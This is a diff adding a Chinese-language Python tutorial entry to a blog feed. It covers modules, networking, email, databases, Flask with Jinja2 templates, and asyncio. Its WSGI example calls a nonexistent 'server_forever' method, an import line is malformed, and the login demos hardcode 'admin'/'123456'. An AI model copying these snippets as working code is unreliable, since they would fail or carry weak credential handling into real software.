+&lt;li&gt;8.&lt;code&gt;contextlib&lt;&#x2F;code&gt;:上下文对象，提供一些文件资源释放的便捷操作&lt;&#x2F;li&gt;
+&lt;li&gt;9.&lt;code&gt;urllib&lt;&#x2F;code&gt;:操作URL的库，http请求之类的&lt;&#x2F;li&gt;
+&lt;li&gt;10.&lt;code&gt;xml&lt;&#x2F;code&gt;:xml操作
+&lt;ul&gt;
+&lt;li&gt;DOM：整个XML一次性读入&lt;&#x2F;li&gt;
+&lt;li&gt;SAX：边读边解析&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;11.&lt;code&gt;HTMLParser&lt;&#x2F;code&gt;：解析Html，解析html中文本、图像等&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-17-di-san-fang-mo-kuai&quot;&gt;2.17 第三方模块&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-17-di-san-fang-mo-kuai&quot; aria-label=&quot;Anchor link for: 2-17-di-san-fang-mo-kuai&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.图像处理：切片、旋转、滤镜、模糊、调色板等
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;PIL&lt;&#x2F;code&gt;(python image library):仅支持python2.7&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;Pillow&lt;&#x2F;code&gt;:支持python3.x，+新特性&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;pip install pillow&lt;&#x2F;code&gt; 安装&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;2.&lt;code&gt;requests&lt;&#x2F;code&gt; 网络访问库&lt;&#x2F;li&gt;
+&lt;li&gt;3.&lt;code&gt;chardet&lt;&#x2F;code&gt; 编码检测库&lt;&#x2F;li&gt;
+&lt;li&gt;4.&lt;code&gt;psutil&lt;&#x2F;code&gt;(process system utilies) 获取系统信息工具库&lt;&#x2F;li&gt;
+&lt;li&gt;5.&lt;code&gt;virtualenv&lt;&#x2F;code&gt; 建立隔离的运行环境
+&lt;ul&gt;
+&lt;li&gt;每个应用使用不同python版本运行环境处理&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;6.图形界面库
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;tkinter&lt;&#x2F;code&gt;：python内置的GUI编程库&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;tk&lt;&#x2F;code&gt;、&lt;code&gt;wxWidgets&lt;&#x2F;code&gt;、&lt;code&gt;Qt&lt;&#x2F;code&gt;、&lt;code&gt;GTK&lt;&#x2F;code&gt;：第三方GUI库&lt;&#x2F;li&gt;
+&lt;li&gt;海龟绘图库(Turtle Graphics):python内置,通过指挥一只小海龟在屏幕上绘图
+&lt;ul&gt;
+&lt;li&gt;起源 LOGO语言：专门给儿童学习编程的语言，特色是通过一只小海龟绘图。&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;import turtle import *&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-18-wang-luo-bian-cheng&quot;&gt;2.18 网络编程&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-18-wang-luo-bian-cheng&quot; aria-label=&quot;Anchor link for: 2-18-wang-luo-bian-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;TCP&#x2F;UDP编程&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;import socket&lt;&#x2F;code&gt; 引入socket库&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-19-dian-zi-you-jian&quot;&gt;2.19 电子邮件&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-19-dian-zi-you-jian&quot; aria-label=&quot;Anchor link for: 2-19-dian-zi-you-jian&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;SMTP 发送邮件协议(内置模块)
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;import smtplib&lt;&#x2F;code&gt;：发送邮件模块&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;import email&lt;&#x2F;code&gt;:构造邮件模块&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;POP3 收取邮件协议(内置模块)(POP协议，最新版本号3)
+&lt;ul&gt;
+&lt;li&gt;1.&lt;code&gt;import poplib&lt;&#x2F;code&gt;：收邮件模块&lt;&#x2F;li&gt;
+&lt;li&gt;2.&lt;code&gt;import email&lt;&#x2F;code&gt;:解析原始文本，构成邮件对象&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-20-shu-ju-ku&quot;&gt;2.20 数据库&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-20-shu-ju-ku&quot; aria-label=&quot;Anchor link for: 2-20-shu-ju-ku&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;(python中,DB-API通用,数据库操作接口类似)&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQLite(内置模块)
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;import sqlite3&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;MySQL
+&lt;ul&gt;
+&lt;li&gt;1.安装MySQL
+&lt;ul&gt;
+&lt;li&gt;windows下，安装选择utf-8&lt;&#x2F;li&gt;
+&lt;li&gt;linux,mac os下，需要编辑配置文件修改编码，改为utf-8。
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;配置文件默认存放在&#x2F;etc&#x2F;my.cnf或者&#x2F;etc&#x2F;mysql&#x2F;my.cnf&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;PS:MySQL版本&amp;gt;=5.5.3，编码可设置为utf-8mb4(和utf-8兼容)，
+还可支持Unicode最新标准，可显示emoji字符&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;2.安装MySQL驱动
+&lt;code&gt;pip install mysql-connector-python --allow-external mysql-connector-python&lt;&#x2F;code&gt;
+或&lt;code&gt;pip install mysql-connector&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;sqlalchemy&lt;&#x2F;code&gt;:第三方ORM(对象关系映射)框架
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;pip install sqlalchemy&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-21-webkai-fa&quot;&gt;2.21 Web开发&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-21-webkai-fa&quot; aria-label=&quot;Anchor link for: 2-21-webkai-fa&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;JSP：html+java的脚步代码形式&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;HTML&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;HTML 网页&lt;&#x2F;li&gt;
+&lt;li&gt;CSS(Cascading Style Sheets)层级样式表&lt;&#x2F;li&gt;
+&lt;li&gt;JS 执行脚本&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;Web应用流程&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.浏览器发送http请求。&lt;&#x2F;li&gt;
+&lt;li&gt;2.服务端接收请求，生成html文档。&lt;&#x2F;li&gt;
+&lt;li&gt;3.服务端把html文档，作为Body发送给浏览器。&lt;&#x2F;li&gt;
+&lt;li&gt;4.浏览器响应，取出Body中的html文档并显示。&lt;&#x2F;li&gt;
+&lt;li&gt;现存Http服务器（Apache、Nginx、Lighttpd等）：用于接收用户请求，从文件读取html，响应返回。&lt;&#x2F;li&gt;
+&lt;li&gt;Python用于动态生成html文档&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;WSGI接口(Web Server GateWay Interface)&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;import wsgiref&lt;&#x2F;code&gt; 内置的WSGI服务器&lt;&#x2F;li&gt;
+&lt;li&gt;ctrl + c终止服务器&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;#Web应用程序WSGI处理函数
+#包含2个参数:environ包含http请求信息的dict对象，start_response发送HTTP响应的函数
+#start_response函数包含2个参数：
+#1.响应码，2.一组list表示的Http Header，使用str表示的tuple类型
+#hello.py
+from wsgiref.simple_server import make_server
+def application(environ,start_response):
+	start_response(&amp;#x27;200 OK&amp;#x27;,[(&amp;#x27;Content-Type&amp;#x27;,&amp;#x27;text&amp;#x2F;html&amp;#x27;)]) #响应Header
+	return [b&amp;#x27;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;hello world&amp;lt;&amp;#x2F;body&amp;gt;&amp;lt;&amp;#x2F;html&amp;gt;&amp;#x27;] #响应Body
+httpd = make_server(&amp;#x27;&amp;#x27;,8000,application) #1.ip地址，2.端口，3.处理函数
+httpd.server_forever()#监听请求
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;WSGI 第三方框架&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Flask&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;pip install flask #安装flask
+#flask默认在5000端口上
+from flask import Flask
+from flask import request
+app = Flask(__name__)
+@app.route(&amp;#x27;&amp;#x2F;&amp;#x27;,methods=[&amp;#x27;GET&amp;#x27;]) 
+def index():
+	return &amp;#x27;&amp;lt;h&amp;gt;hello world&amp;lt;&amp;#x2F;h&amp;gt;&amp;#x27;
+
+@app.route(&amp;#x27;&amp;#x2F;login&amp;#x27;,methods=[&amp;#x27;GET&amp;#x27;]) #&amp;#x2F;login选项框
+def login():
+	return &amp;#x27;&amp;#x27;&amp;#x27;&amp;lt;form action=&amp;quot;&amp;#x2F;login&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
+			&amp;lt;p&amp;gt;&amp;lt;input name=&amp;quot;username&amp;quot;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
+			&amp;lt;p&amp;gt;&amp;lt;input name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
+			&amp;lt;p&amp;gt;&amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;Sign In&amp;lt;&amp;#x2F;button&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
+			&amp;lt;&amp;#x2F;form&amp;gt;&amp;#x27;&amp;#x27;&amp;#x27;
+#flask通过request.form[&amp;#x27;name&amp;#x27;]来获取表单的内容
+@app.route(&amp;#x27;&amp;#x2F;login&amp;#x27;,methods=[&amp;#x27;POST&amp;#x27;])#&amp;#x2F;login输入进行post请求
+def loginP():
+	if request.form[&amp;#x27;username&amp;#x27;]==&amp;#x27;admin&amp;#x27; and request.form[&amp;#x27;password&amp;#x27;]==&amp;#x27;123456&amp;#x27;:
+		return &amp;#x27;&amp;lt;h&amp;gt;hello admin&amp;lt;&amp;#x2F;h&amp;gt;&amp;#x27;
+	return &amp;#x27;&amp;lt;h&amp;gt;login error!&amp;lt;&amp;#x2F;h&amp;gt;&amp;#x27;
+if(__name__==&amp;#x27;__main__&amp;#x27;):
+	app.run()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Django:全能型Web框架&lt;&#x2F;li&gt;
+&lt;li&gt;web.py:小巧的Web框架&lt;&#x2F;li&gt;
+&lt;li&gt;Bottle:和Flask类似的Web框架&lt;&#x2F;li&gt;
+&lt;li&gt;Tornado:Facebook开源异步Web框架&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;html模板：分离html和业务逻辑 MVC模式&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;模板：独立html文件，内部传入数据变量的格式&lt;&#x2F;li&gt;
+&lt;li&gt;flask
+&lt;ul&gt;
+&lt;li&gt;jinja2：默认支持模板&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;`pip install jinja2`
+	- `{{name}}`：html中表示变量name
+	- `{%...%}`：html中`...`表示指令写的地方
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre&gt;&lt;code&gt;#模板html存放在目录templates,templates和.py运行文件同级目录下
+#render_template() 显示模板
+#index.html
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h&amp;gt;hello world&amp;lt;&amp;#x2F;h&amp;gt;
+&amp;lt;&amp;#x2F;body&amp;gt;
+&amp;lt;&amp;#x2F;html&amp;gt;
+#login.html
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+{% if message %}		
+&amp;lt;p&amp;gt;{{message}}&amp;lt;&amp;#x2F;p&amp;gt;
+{% endif %}
+&amp;lt;form action=&amp;quot;&amp;#x2F;login&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
+	&amp;lt;p&amp;gt;&amp;lt;input name=&amp;quot;username&amp;quot; value=&amp;quot;{{username}}&amp;quot;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
+	&amp;lt;p&amp;gt;&amp;lt;input name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
+	&amp;lt;p&amp;gt;&amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;Sign In&amp;lt;&amp;#x2F;button&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
+	&amp;lt;&amp;#x2F;form&amp;gt;
+&amp;lt;&amp;#x2F;body&amp;gt;
+&amp;lt;&amp;#x2F;html&amp;gt;
+#login_ok.html
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h&amp;gt;hello {{name}}&amp;lt;&amp;#x2F;h&amp;gt;
+&amp;lt;&amp;#x2F;body&amp;gt;
+&amp;lt;&amp;#x2F;html&amp;gt;
+#index.py
+from flask import Flask
+from flask import request
+from flask import render_template
+app = Flask(__name__)
+@app.route(&amp;#x27;&amp;#x2F;&amp;#x27;,methods=[&amp;#x27;GET&amp;#x27;])
+def index():
+	return render_template(&amp;#x27;index.html&amp;#x27;)
+
+@app.route(&amp;#x27;&amp;#x2F;login&amp;#x27;,methods=[&amp;#x27;GET&amp;#x27;])
+def login():
+	return render_template(&amp;#x27;login.html&amp;#x27;)
+@app.route(&amp;#x27;&amp;#x2F;login&amp;#x27;,methods=[&amp;#x27;POST&amp;#x27;])
+def loginP():
+	if request.form[&amp;#x27;username&amp;#x27;]==&amp;#x27;admin&amp;#x27; and request.form[&amp;#x27;password&amp;#x27;]==&amp;#x27;123456&amp;#x27;:
+		return render_template(&amp;#x27;login_ok.html&amp;#x27;,username=&amp;#x27;admin&amp;#x27;)
+	else:
+		return render_template(&amp;#x27;login.html&amp;#x27;,message=&amp;#x27;Error username or password!&amp;#x27;,username=request.form[&amp;#x27;username&amp;#x27;])
+if(__name__==&amp;#x27;__main__&amp;#x27;):
+	app.run()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Mako模板
+&lt;ul&gt;
+&lt;li&gt;${name} 变量&lt;&#x2F;li&gt;
+&lt;li&gt;&amp;lt;%...%&amp;gt; 指令&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Cheetah模板
+&lt;ul&gt;
+&lt;li&gt;${name} 变量&lt;&#x2F;li&gt;
+&lt;li&gt;&amp;lt;%...%&amp;gt; 指令&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Django&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;- {{name}} 变量
+- {%...%} 指令
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-22-yi-bu-io&quot;&gt;2.22 异步IO&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-22-yi-bu-io&quot; aria-label=&quot;Anchor link for: 2-22-yi-bu-io&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;异步IO模型：利用主线程消息循环。执行IO操作时，只是发出IO指令不等待结果，继续执行其他代码，等待
+IO通知后再来处理。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;协程：一个线程执行多个函数之间不按顺序调用，切换调用(函数调用一半切换到另一个函数执行)&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;python中通过generator实现了协程。当next(generator),
+对生成generator函数进行中断处理，然后执行其他函数&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;#同一个线程内，边写边读
+def read():
+	r = &amp;#x27;&amp;#x27;
+	while True:
+		read = yield r
+		if read:
+			print(&amp;#x27;read =&amp;#x27;,read)
+
+def write(r):
+	r.send(None)
+	i=1
+	while i&amp;lt;10:
+		print(&amp;#x27;write =&amp;#x27;,i)
+		r.send(i)
+		i=i+1
+
+r = read()
+write(r)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;asyncio:内置异步IO支持&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@asyncio.coroutine&lt;&#x2F;code&gt; generator标记为coroutine&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;yield from &amp;lt;coroutine&amp;gt;&lt;&#x2F;code&gt;切换协程&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;asyncio.get_event_loop()&lt;&#x2F;code&gt;消息循环&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;loop.run_until_complete(&amp;lt;task()&amp;gt;或asyncio.wait(&amp;lt;tasks&amp;gt;))&lt;&#x2F;code&gt; tasks=(task(),task())&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import threading
+import asyncio
+
+@asyncio.coroutine
+def hello():
+	print(&amp;#x27;Hello world %s!&amp;#x27;%threading.currentThread())
+	yield from asyncio.sleep(1) #切换到其他协程延时1秒
+	print(&amp;#x27;Hello again %s!&amp;#x27;%threading.currentThread())
+
+loop = asyncio.get_event_loop() #消息循环
+tasks=[hello(),hello()]
+loop.run_until_complete(asyncio.wait(tasks)) #或者loop.run_until_complete(hello())运行一个
+loop.close()
+
+输出：
+Hello world &amp;lt;_MainThread(MainThread, started 680)&amp;gt;!
+Hello world &amp;lt;_MainThread(MainThread, started 680)&amp;gt;!
+#暂停1秒后显示下面
+Hello again &amp;lt;_MainThread(MainThread, started 680)&amp;gt;!
+Hello again &amp;lt;_MainThread(MainThread, started 680)&amp;gt;!
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;async&#x2F;await&lt;&#x2F;code&gt; Python3.5以后新的语法
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@asyncio.coroutine&lt;&#x2F;code&gt;替换为&lt;code&gt;async&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;yield from&lt;&#x2F;code&gt; 替换为&lt;code&gt;await&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import threading
+import asyncio
+
+async def hello():
+	print(&amp;#x27;Hello world %s!&amp;#x27;%threading.currentThread())
+	await asyncio.sleep(1) #切换到其他协程延时1秒
+	print(&amp;#x27;Hello again %s!&amp;#x27;%threading.currentThread())
+
+loop = asyncio.get_event_loop() #消息循环
+tasks=[hello(),hello()]
+loop.run_until_complete(asyncio.wait(tasks))
+loop.close()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;aiohttp&lt;&#x2F;code&gt;:基于asyncio实现的HTTP框架
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;pip install aiohttp&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import asyncio
+from aiohttp import web #pip install aiohttp
+
+async def index(request):
+	await asyncio.sleep(0.5)
+	return web.Response(body= (&amp;#x27;hello, %s!&amp;#x27; % request.match_info[&amp;#x27;name&amp;#x27;]))
+
+async def init(loop):
+	app = web.Application(loop=loop)
+	app.router.add_route(&amp;#x27;GET&amp;#x27;,&amp;#x27;&amp;#x2F;{name}&amp;#x27;,index)
+	ser =await loop.create_server(app.make_handler(),&amp;#x27;localhost&amp;#x27;,8000)
+	print(&amp;#x27;Server started at http:&amp;#x2F;&amp;#x2F;localhost:8000 ...&amp;#x27;)
+	return ser
+loop = asyncio.get_event_loop()
+loop.run_until_complete(init(loop))
+loop.run_forever()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+</feed>
